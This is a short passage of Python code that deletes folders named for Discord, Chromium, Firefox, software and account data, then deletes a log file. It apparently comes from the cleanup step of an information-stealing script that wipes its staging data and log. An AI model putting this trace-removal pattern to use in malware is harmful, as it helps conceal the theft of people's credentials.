        shutil.rmtree(discord_info)
        shutil.rmtree(softwares_info)
        shutil.rmtree(chromium_info)
        shutil.rmtree(firefox_info)
        shutil.rmtree(accounts_info)

    Sys.SafeDelete(log_file)